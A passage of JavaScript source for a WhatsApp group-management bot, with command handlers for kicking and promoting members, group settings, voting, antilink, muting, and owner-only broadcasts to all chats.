          global.author = text.split("|")[1]
          m.reply(`𝖊𝖝𝖎𝖋 𝖘𝖊𝖙 𝖙𝖔\n\n🏷 𝖕𝖆𝖈𝖐𝖓𝖆𝖒𝖊 : ${global.packname}\n🏷 𝖆𝖚𝖙𝖍𝖔𝖗 : ${global.author}`)
            }
            break
	case 'kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await sparrow.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await sparrow.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await sparrow.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await sparrow.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await sparrow.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await sparrow.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw '𝖜𝖍𝖊𝖗𝖊 𝖎𝖘 𝖙𝖍𝖊 𝖙𝖊𝖝𝖙?'
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                await sparrow.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw '𝖜𝖍𝖊𝖗𝖊 𝖎𝖘 𝖙𝖍𝖊 𝖙𝖊𝖝𝖙?'
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                await sparrow.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break

          case 'setppbot': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖎𝖒𝖆𝖌𝖊!`
                if (!/image/.test(mime)) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖎𝖒𝖆𝖌𝖊!`
                if (/webp/.test(mime)) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖎𝖒𝖆𝖌𝖊!`
                let media = await sparrow.downloadAndSaveMediaMessage(quoted)
                await sparrow.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖎𝖒𝖆𝖌𝖊!`
                if (!/image/.test(mime)) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖎𝖒𝖆𝖌𝖊!`
                if (/webp/.test(mime)) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖎𝖒𝖆𝖌𝖊!`
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                let media = await sparrow.downloadAndSaveMediaMessage(quoted)
                await sparrow.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'tagall': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
let teks = `──────〔 𝖙𝖆𝖌 𝖆𝖑𝖑 〕──────
 
 📜 𝖒𝖊𝖘𝖘𝖆𝖌𝖊 : ${q ? q : '𝖓𝖚𝖑𝖑'}\n\n`
                for (let mem of participants) {
                teks += `🏷 @${mem.id.split('@')[0]}\n`
                }
                sparrow.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
            sparrow.sendMessage(m.chat, { text : q ? q : m.quoted , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
		db.data.users[m.sender].limit -= 1
		let { styletext } = require('./lib/scraper')
		if (!text) throw '𝖜𝖍𝖊𝖗𝖊 𝖎𝖘 𝖙𝖍𝖊 𝖙𝖊𝖝𝖙?'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `🌹*${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `𝖙𝖍𝖊𝖗𝖊 𝖎𝖘 𝖆𝖓 𝖔𝖓𝖌𝖔𝖎𝖓𝖌 𝖛𝖔𝖙𝖊 𝖘𝖊𝖘𝖘𝖎𝖔𝖓!\n\n𝖙𝖞𝖕𝖊 ${prefix}𝖉𝖊𝖑𝖛𝖔𝖙𝖊 𝖙𝖔 𝖉𝖊𝖑𝖊𝖙𝖊 𝖙𝖍𝖊 𝖘𝖊𝖘𝖘𝖎𝖔𝖓`
            if (!text) throw `𝖊𝖝𝖆𝖒𝖕𝖑𝖊: ${prefix + command} 𝖘𝖔𝖗𝖗𝖞 𝖓𝖔𝖙𝖘𝖔𝖗𝖗𝖞`
            if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
            sparrow.reply(m.chat, `𝖛𝖔𝖙𝖎𝖓𝖌 𝖘𝖙𝖆𝖗𝖙𝖊𝖉!\n\n📍${prefix}𝖚𝖕𝖛𝖔𝖙𝖊 - 𝖋𝖔𝖗 𝖘𝖚𝖕𝖕𝖔𝖗𝖙𝖎𝖓𝖌\n📍${prefix}𝖉𝖊𝖛𝖔𝖙𝖊 - 𝖉𝖊𝖛𝖔𝖙𝖊\n📍${prefix}𝖈𝖍𝖊𝖈𝖐𝖛𝖔𝖙𝖊 - 𝖈𝖍𝖊𝖈𝖐 𝖛𝖔𝖙𝖊𝖘\n📍${prefix}𝖉𝖊𝖑𝖛𝖔𝖙𝖊 - 𝖉𝖊𝖑𝖊𝖙𝖊 𝖛𝖔𝖙𝖊`, m)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `──────〔 𝖛𝖔𝖙𝖊 〕──────

𝖗𝖊𝖆𝖘𝖔𝖓: ${vote[m.chat][0]}

─〔 𝖚𝖕𝖛𝖔𝖙𝖊 〕

  𝖙𝖔𝖙𝖆𝖑: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}


─〔 𝖉𝖊𝖛𝖔𝖙𝖊 〕

  𝖙𝖔𝖙𝖆𝖑: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}

──────〔 𝖛𝖔𝖙𝖊 〕──────
`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝖘𝖚𝖕𝖕𝖔𝖗𝖙'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝖉𝖊𝖛𝖔𝖙𝖊'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: sparrow.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            sparrow.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `𝖙𝖍𝖊𝖗𝖊 𝖎𝖘 𝖓𝖔 𝖛𝖔𝖙𝖎𝖓𝖌 𝖘𝖊𝖘𝖘𝖎𝖔𝖓 𝖎𝖓 𝖙𝖍𝖎𝖘 𝖌𝖗𝖔𝖚𝖕!`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `──────〔 𝖛𝖔𝖙𝖊 〕──────

𝖗𝖊𝖆𝖘𝖔𝖓: ${vote[m.chat][0]}

─〔 𝖚𝖕𝖛𝖔𝖙𝖊 〕

  𝖙𝖔𝖙𝖆𝖑: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}


─〔 𝖉𝖊𝖛𝖔𝖙𝖊 〕

  𝖙𝖔𝖙𝖆𝖑: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}

──────〔 𝖛𝖔𝖙𝖊 〕──────
`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝖘𝖚𝖕𝖕𝖔𝖗𝖙'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝖉𝖊𝖛𝖔𝖙𝖊'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: sparrow.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            sparrow.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `𝖙𝖍𝖊𝖗𝖊 𝖎𝖘 𝖓𝖔 𝖛𝖔𝖙𝖎𝖓𝖌 𝖘𝖊𝖘𝖘𝖎𝖔𝖓 𝖎𝖓 𝖙𝖍𝖎𝖘 𝖌𝖗𝖔𝖚𝖕!`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `──────〔 𝖛𝖔𝖙𝖊 〕──────

𝖗𝖊𝖆𝖘𝖔𝖓: ${vote[m.chat][0]}

─〔 𝖚𝖕𝖛𝖔𝖙𝖊 〕

  𝖙𝖔𝖙𝖆𝖑: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}


─〔 𝖉𝖊𝖛𝖔𝖙𝖊 〕

  𝖙𝖔𝖙𝖆𝖑: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}

──────〔 𝖛𝖔𝖙𝖊 〕──────
`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝖘𝖚𝖕𝖕𝖔𝖗𝖙'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝖉𝖊𝖛𝖔𝖙𝖊'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: sparrow.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            sparrow.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'checkvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `𝖙𝖍𝖊𝖗𝖊 𝖎𝖘 𝖓𝖔 𝖛𝖔𝖙𝖎𝖓𝖌 𝖘𝖊𝖘𝖘𝖎𝖔𝖓 𝖎𝖓 𝖙𝖍𝖎𝖘 𝖌𝖗𝖔𝖚𝖕!`
teks_vote = `──────〔 𝖛𝖔𝖙𝖊 〕──────

𝖗𝖊𝖆𝖘𝖔𝖓: ${vote[m.chat][0]}

─〔 𝖚𝖕𝖛𝖔𝖙𝖊 〕

  𝖙𝖔𝖙𝖆𝖑: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}


─〔 𝖉𝖊𝖛𝖔𝖙𝖊 〕

  𝖙𝖔𝖙𝖆𝖑: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}

──────〔 𝖛𝖔𝖙𝖊 〕──────
`
sparrow.reply(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `𝖙𝖍𝖊𝖗𝖊 𝖎𝖘 𝖓𝖔 𝖛𝖔𝖙𝖎𝖓𝖌 𝖘𝖊𝖘𝖘𝖎𝖔𝖓 𝖎𝖓 𝖙𝖍𝖎𝖘 𝖌𝖗𝖔𝖚𝖕!`
            delete vote[m.chat]
            sparrow.reply(m.chat,'𝖉𝖊𝖑𝖊𝖙𝖊𝖉 𝖛𝖔𝖙𝖊 𝖘𝖊𝖘𝖘𝖎𝖔𝖓 𝖎𝖓 𝖙𝖍𝖎𝖘 𝖌𝖗𝖔𝖚𝖕.',m)
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                if (args[0] === 'close'){
                    await sparrow.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await sparrow.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: '𝖔𝖕𝖊𝖓' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: '𝖈𝖑𝖔𝖘𝖊' }, type: 1 }
                    ]
                    await sparrow.sendButtonText(m.chat, buttons, `Mode Group`, sparrow.user.name, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
             if (args[0] === 'open'){
                await sparrow.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await sparrow.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await sparrow.sendButtonText(m.chat, buttons, `Mode Edit Info`, sparrow.user.name, m)

            }
            }
            break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`𝖆𝖑𝖗𝖊𝖆𝖉𝖞 𝖆𝖈𝖙𝖎𝖛𝖊.`)
                db.data.chats[m.chat].antilink = true
                sparrow.reply(m.chat, `⚠️𝖆𝖓𝖙𝖎𝖑𝖎𝖓𝖐 𝖆𝖈𝖙𝖎𝖛𝖆𝖙𝖊𝖉⚠️ \n\n🏷𝖔𝖓𝖑𝖞 𝖆𝖉𝖒𝖎𝖓𝖘 𝖆𝖗𝖊 𝖆𝖑𝖑𝖔𝖜𝖊𝖉 𝖙𝖔 𝖘𝖊𝖓𝖉 𝖌𝖗𝖔𝖚𝖕 𝖑𝖎𝖓𝖐𝖘❗`, m)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`𝖎𝖙𝖘 𝖓𝖔𝖙 𝖆𝖈𝖙𝖎𝖛𝖊!`)
                db.data.chats[m.chat].antilink = false
                sparrow.reply(m.chat, `𝖆𝖓𝖙𝖎𝖑𝖎𝖓𝖐 𝖉𝖊𝖆𝖈𝖙𝖎𝖛𝖆𝖙𝖊𝖉!`, m)
                } else {
                 sendLstMessage(m.chat, '𝖆𝖓𝖙𝖎𝖑𝖎𝖓𝖐', '「 𝖏𝖆𝖗𝖛𝖎𝖘 」', '𝖈𝖑𝖎𝖈𝖐 𝖍𝖊𝖗𝖊', '𝖘𝖊𝖑𝖊𝖈𝖙 𝖔𝖓𝖊', [
            {title: "𝖆𝖓𝖙𝖎𝖑𝖎𝖓𝖐 𝖔𝖕𝖙𝖎𝖔𝖓𝖘",rows: 
            [{title: "𝖆𝖓𝖙𝖎𝖑𝖎𝖓𝖐 𝖔𝖓", rowId: "antilink on"},
            {title: "𝖆𝖓𝖙𝖎𝖑𝖎𝖓𝖐 𝖔𝖋𝖋", rowId: "antilink off"}]}])
                }
             }
             break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`𝖆𝖑𝖗𝖊𝖆𝖉𝖞 𝖒𝖚𝖙𝖊𝖉.`)
                db.data.chats[m.chat].mute = true
                sparrow.reply(m.chat,`${sparrow.user.name} 𝖒𝖚𝖙𝖊𝖉 𝖎𝖓 𝖙𝖍𝖎𝖘 𝖌𝖗𝖔𝖚𝖕!`,m)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`𝖎𝖙𝖘 𝖓𝖔𝖙 𝖒𝖚𝖙𝖊𝖉.`)
                db.data.chats[m.chat].mute = false
                sparrow.reply(m.chat,`${sparrow.user.name} 𝖚𝖓𝖒𝖚𝖙𝖊𝖉 𝖎𝖓 𝖙𝖍𝖎𝖘 𝖌𝖗𝖔𝖚𝖕!`,m)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: '𝖔𝖓' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: '𝖔𝖋𝖋' }, type: 1 }
                    ]
                    await sparrow.sendButtonText(m.chat, buttons, `Mute Bot`, sparrow.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                let response = await sparrow.groupInviteCode(m.chat)
                sparrow.reply(m.chat, `🌹${groupMetadata.subject} \n\n🌹𝖉𝖊𝖘𝖈𝖗𝖎𝖕𝖙𝖎𝖔𝖓: ${groupMetadata}\n🌹𝖌𝖗𝖔𝖚𝖕 𝖑𝖎𝖓𝖐 : https://chat.whatsapp.com/${response}\nhttps://ẉạ.me/𔒝`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw '𝖊𝖓𝖆𝖇𝖑𝖊/𝖉𝖎𝖘𝖆𝖇𝖑𝖊'
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                if (args[0] === 'enable') {
                    await sparrow.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await sparrow.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'd': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (isBaileys) {
                sparrow.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
                } else {
                sparrow.sendMessage(m.chat,{delete: {remoteJid: m.chat,fromMe: false,id: m.quoted.id,participant: m.quoted.sender}})
            }}
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await sparrow.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`𝖙𝖔𝖙𝖆𝖑 𝖌𝖗𝖔𝖚𝖕𝖘: ${anu.length} 𝖇𝖗𝖔𝖆𝖉𝖈𝖆𝖘𝖙𝖎𝖓𝖌 𝖎𝖓 ${anu.length * 1.5} 𝖘𝖊𝖈𝖔𝖓𝖉𝖘.`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{urlButton: { displayText: '𝖌𝖎𝖙𝖍𝖚𝖇', url: 'https://github.com/sparroo' }
                            }, { callButton: { displayText: '𝖔𝖜𝖓𝖊𝖗', phoneNumber: '+91 9947291867' }
                            }, { quickReplyButton: { displayText: '𝖘𝖕𝖊𝖊𝖉', id: 'ping' }
                            }, { quickReplyButton: { displayText: '𝖎𝖓𝖋𝖔', id: 'menu' }  
                            }, { quickReplyButton: { displayText: '𝖒𝖊𝖓𝖚', id: 'help' }}]
                      let txt = `「 𝖏𝖆𝖗𝖛𝖎𝖘 」\n\n${text}`
                      sparrow.send5ButImg(i, txt, sparrow.user.name, global.thumb, btn)
                    }
                m.reply(`𝖘𝖚𝖈𝖈𝖊𝖘𝖋𝖚𝖑𝖑𝖞 𝖇𝖗𝖔𝖆𝖉𝖈𝖆𝖘𝖙𝖊𝖉 𝖙𝖔 ${anu.length} 𝖌𝖗𝖔𝖚𝖕𝖘.`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`𝖙𝖔𝖙𝖆𝖑 𝖈𝖍𝖆𝖙𝖘: ${anu.length}\n𝖇𝖗𝖔𝖆𝖉𝖈𝖆𝖘𝖙𝖎𝖓𝖌 𝖎𝖓 ${anu.length * 1.5} 𝖘𝖊𝖈𝖔𝖓𝖉𝖘.`)
                if (/video/.test(mime)) {
                for (let yoi of anu) {
		        await sleep(1500)
		        let media = await quoted.download()
                sparrow.sendMessage(yoi, {video: media, mimetype:'audio/mpeg', ptt:true, contextInfo: {'externalAdReply':{'title':`${text}`,'body':'𝖙𝖍𝖊𝖗𝖊','previewType':'VIDEO','thumbnailUrl':'','thumbnail':fs.readFileSync('./lib/jarvis.jpg'),'sourceUrl':'https://github.com/sparroo'}}})
                }} if (/audio/.test(mime)) {
                for (let yoi of anu) {
		        await sleep(1500)
		        let media = await quoted.download()
                let { toPTT } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                sparrow.sendMessage(yoi, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo: {'externalAdReply':{'title':`${text}`,'body':'𝖙𝖍𝖊𝖗𝖊','previewType':'VIDEO','thumbnailUrl':'','thumbnail':fs.readFileSync('./lib/jarvis.jpg'),'sourceUrl':'https://github.com/sparroo'}}})
                }} else {
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{ urlButton: { displayText: '𝖌𝖎𝖙𝖍𝖚𝖇', url: 'https://github.com/sparroo' }
                            }, { callButton: { displayText: '𝖔𝖜𝖓𝖊𝖗', phoneNumber: '+91 9947291867' }
                            }, { quickReplyButton: { displayText: '𝖘𝖕𝖊𝖊𝖉', id: 'ping' }
                            }, { quickReplyButton: { displayText: '𝖎𝖓𝖋𝖔', id: 'menu' }  
                            }, { quickReplyButton: { displayText: '𝖒𝖊𝖓𝖚', id: 'help' }
                            }]
                      let txt = `「 𝖏𝖆𝖗𝖛𝖎𝖘 」\n\n${text}`
                      sparrow.send5ButImg(yoi, txt, sparrow.user.name, global.thumb, btn)
		}}
		m.reply('𝖘𝖚𝖈𝖈𝖊𝖘𝖘.')
            }
            break
            case 'infochat': {
                if (!m.quoted) m.reply('𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆 𝖒𝖘𝖌.')
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw '𝖎𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖆 𝖇𝖔𝖙 𝖒𝖊𝖘𝖘𝖆𝖌𝖊!'
                let teks = '🔅𝖎𝖓𝖋𝖔𝖈𝖍𝖆𝖙🔅'
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `🌹𝖓𝖆𝖒𝖊: @${i.userJid.split('@')[0]}\n`
                    teks += ` 🏷 𝖙𝖎𝖒𝖊 : ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')}\n🏷 𝖘𝖙𝖆𝖙𝖚𝖘 : ${read ? '𝖗𝖊𝖆𝖉' : '𝖚𝖓𝖗𝖊𝖆𝖉'}\n\n`
                }
                sparrow.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆 𝖒𝖊𝖘𝖘𝖆𝖌𝖊!')
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return sparrow.reply(m.chat, mess.endLimit, m)
	db.data.users[m.sender].limit -= 1
		let wokwol = await sparrow.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('𝖎𝖙 𝖉𝖔𝖊𝖘 𝖓𝖔𝖙 𝖍𝖆𝖛𝖊 𝖆 𝖖𝖚𝖔𝖙𝖊𝖉 𝖒𝖊𝖘𝖘𝖆𝖌𝖊!')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
            if (!isCreator) throw mess.owner
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `𝖕𝖊𝖗𝖘𝖔𝖓𝖆𝖑 𝖈𝖍𝖆𝖙 𝖑𝖎𝖘𝖙\n\n🌹𝖙𝖔𝖙𝖆𝖑 𝖈𝖍𝖆𝖙𝖘 : ${anu.length} 𝖈𝖍𝖆𝖙𝖘\n\n`
